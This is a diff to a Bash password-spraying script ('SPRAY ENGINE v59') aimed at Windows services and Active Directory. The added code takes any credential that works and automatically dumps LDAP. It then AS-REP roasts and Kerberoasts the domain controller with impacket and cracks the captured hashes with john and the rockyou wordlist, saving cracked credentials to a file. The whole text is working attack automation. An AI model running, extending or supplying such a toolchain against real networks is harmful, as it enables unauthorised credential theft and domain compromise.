@@ -1413,6 +1413,10 @@ CLEAN_OUT="$OUTDIR/final_auth_success.txt"
 SPIDER_DIR="$OUTDIR/spider_plus"
 BROKEN_PIPE_LOG="$OUTDIR/broken_pipe_hosts.txt"
 : > "$BROKEN_PIPE_LOG"
+DC_INFO="$OUTDIR/dc_domain_mapping.txt"
+DC_CANDIDATES="$OUTDIR/dc_candidates.txt"
+FINAL_CRACKED="$OUTDIR/final_cracked_asrep_kerberoast.txt"
+echo "" > "$FINAL_CRACKED"
 
 echo -e "${PURPLE}====================================================${NC}"
 echo -e "${GREEN}[+] SPRAY ENGINE v59 | DEBUG & EXPLICIT MODE${NC}"
@@ -1425,6 +1429,30 @@ done
 
 mapfile -t MAPFILE_U < "$USER_FILE"
 mapfile -t MAPFILE_P < "$PASS_FILE"
+
+# =========================
+# INIT GLOBAL STATE
+# =========================
+declare -A DC_MAP
+declare -A ASREP_DONE
+declare -A KERB_DONE
+
+# =========================
+# LOAD DC MAPPING (dc_ip;domain)
+# =========================
+if [[ -s "$DC_INFO" ]]; then
+    while IFS=';' read -r dc_ip dc_domain; do
+        [[ -z "$dc_ip" || -z "$dc_domain" ]] && continue
+        DC_MAP["$dc_domain"]="$dc_ip"
+    done < "$DC_INFO"
+
+    echo -e "${GREEN}[+] Loaded DC mapping:${NC}"
+    for d in "${!DC_MAP[@]}"; do
+        echo -e "    ${CYAN}$d${NC} -> ${YELLOW}${DC_MAP[$d]}${NC}"
+    done
+else
+    echo -e "${YELLOW}[!] No DC mapping file found ($DC_INFO)${NC}"
+fi
 
 PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "ldap")
 
@@ -1580,6 +1608,7 @@ for ip in "${!PROTO_MAP[@]}"; do
                         DOMAIN_ARG="-d $DOMAIN"
                     fi
                 fi
+
                 # =========================
                 # SUCCESS HANDLING
                 # =========================
@@ -1587,17 +1616,121 @@ for ip in "${!PROTO_MAP[@]}"; do
                     AUTH_RESULT=$(cat .tmp_res)
                     echo -e "${GREEN}[!] Success: $user@$ip${NC}"
 
-                    # --- LDAP DUMP ---
+                    dc_ip="${DC_MAP[$DOMAIN]}"
+
+                    # =========================
+                    # LDAP DUMP
+                    # =========================
                     if [[ "$proto" == "ldap" ]]; then
                         DUMP_PATH="$OUTDIR/ldap_$ip"
                         mkdir -p "$DUMP_PATH"
+
                         echo -e "${YELLOW}[!] Running ldapdomaindump...${NC}"
-                        LDAP_USER="${DOMAIN}\\$user"
-                        [[ "$DOMAIN" == "." ]] && LDAP_USER="$user"
+
+                        if [[ "$DOMAIN" == "." ]]; then
+                            LDAP_USER="$user"
+                        else
+                            LDAP_USER="${DOMAIN}\\$user"
+                        fi
+
                         ldapdomaindump "$ip" -u "$LDAP_USER" -p "$pass" -o "$DUMP_PATH" >/dev/null 2>&1
                     fi
 
-                    # --- SMB POST EXPLOIT ---
+
+                    # =========================
+                    # ASREP ROAST (ONCE PER DOMAIN)
+                    # =========================
+                    echo -e "${GRAY}[DEBUG] DOMAIN=$DOMAIN | DC=${DC_MAP[$DOMAIN]}${NC}"
+                    if [[ -n "$dc_ip" && "$DOMAIN" != "." && -z "${ASREP_DONE[$DOMAIN]}" ]]; then
+                        ASREP_DONE[$DOMAIN]=1
+
+                        echo -e "${PURPLE}[EXEC] ASREP roasting → $DOMAIN ($dc_ip)${NC}"
+
+                        ASREP_HASH_FILE="$OUTDIR/asrep_${DOMAIN}.txt"
+                        USERS_FILE="$OUTDIR/users_${DOMAIN}.txt"
+
+                        # Ambil user dari LDAP dump kalau ada
+                        if [[ -s "$OUTDIR/ldap_$ip/domain_users.grep" ]]; then
+                            awk '{print $1}' "$OUTDIR/ldap_$ip/domain_users.grep" | sort -u > "$USERS_FILE"
+                        else
+                            printf "%s\n" "${MAPFILE_U[@]}" > "$USERS_FILE"
+                        fi
+
+                        timeout 30s impacket-GetNPUsers "$DOMAIN/$user:$pass" \
+                            -dc-ip "$dc_ip" \
+                            -request \
+                            -format hashcat \
+                            -outputfile "$ASREP_HASH_FILE" >/dev/null 2>&1
+
+
+                        if [[ -s "$ASREP_HASH_FILE" ]]; then
+                            echo -e "${RED}[!] ASREP hash found:${NC}"
+                            cat "$ASREP_HASH_FILE"
+
+                            echo -e "${YELLOW}[*] Cracking ASREP hashes...${NC}"
+                            john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \
+                                 "$ASREP_HASH_FILE"
+
+                            echo -e "${GREEN}[+] Cracked ASREP results:${NC}"
+                            ASREP_RESULT=$(john --show "$ASREP_HASH_FILE")
+
+                            echo "$ASREP_RESULT"
+
+                            # append ke file final
+                            if [[ -n "$ASREP_RESULT" ]]; then
+                                echo -e "\n[ASREP]" >> "$FINAL_CRACKED"
+                                echo "$ASREP_RESULT" | grep ":" >> "$FINAL_CRACKED"
+                            fi
+
+                        else
+                            echo -e "${GREEN}[+] No ASREP roastable users${NC}"
+                        fi
+
+                    fi
+
+                    # =========================
+                    # KERBEROAST (ONCE PER DOMAIN)
+                    # =========================
+                    if [[ -n "$dc_ip" && "$DOMAIN" != "." && -z "${KERB_DONE[$DOMAIN]}" ]]; then
+                        KERB_DONE[$DOMAIN]=1
+
+                        echo -e "${PURPLE}[EXEC] Kerberoasting → $DOMAIN ($dc_ip)${NC}"
+
+                        KERB_HASH_FILE="$OUTDIR/kerberoast_${DOMAIN}.txt"
+
+                        timeout 30s impacket-GetUserSPNs "$DOMAIN/$user:$pass" \
+                            -dc-ip "$dc_ip" \
+                            -request \
+                            -outputfile "$KERB_HASH_FILE" >/dev/null 2>&1
+
+
+                        if [[ -s "$KERB_HASH_FILE" ]]; then
+                            echo -e "${RED}[!] Kerberoast hash found:${NC}"
+                            cat "$KERB_HASH_FILE"
+
+                            john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \
+                                 "$KERB_HASH_FILE" >/dev/null 2>&1
+
+                            KERB_RESULT=$(john --show "$KERB_HASH_FILE")
+
+                            echo -e "${GREEN}[+] Cracked Kerberoast results:${NC}"
+                            echo "$KERB_RESULT"
+
+                            # append ke file final
+                            if [[ -n "$KERB_RESULT" ]]; then
+                                echo -e "\n[KERBEROAST]" >> "$FINAL_CRACKED"
+                                echo "$KERB_RESULT" | grep ":" >> "$FINAL_CRACKED"
+                            fi
+
+                        else
+                            echo -e "${GREEN}[+] No Kerberoastable accounts${NC}"
+                        fi
+                    fi
+
+                    # =========================
+                    # SMB POST EXPLOIT
+                    # =========================
+
                     if [[ "$proto" == "smb" ]]; then
                         # Cek apakah akses SMB valid (+)
                         if echo "$AUTH_RESULT" | grep -q "\[+\]"; then
